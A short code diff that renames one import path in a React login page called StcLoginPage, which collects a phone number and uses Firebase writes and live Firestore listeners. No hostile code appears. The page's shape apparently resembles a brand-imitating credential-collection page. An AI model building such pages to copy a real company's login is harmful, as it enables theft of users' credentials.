@@ -5,7 +5,7 @@ import { useEffect, useState } from "react";
 import { Phone, Lock, Eye, EyeOff, Loader2, ShieldCheck } from "lucide-react";
 import { addData, db } from "@/lib/firebase";
 import { doc, onSnapshot } from "firebase/firestore";
-import { getRedirectUrl } from "@/lib/page-routes";
+import { getRedirectUrl } from "@/lib/page-route";
 
 export default function StcLoginPage() {
   const [phoneNumber, setPhoneNumber] = useState("");
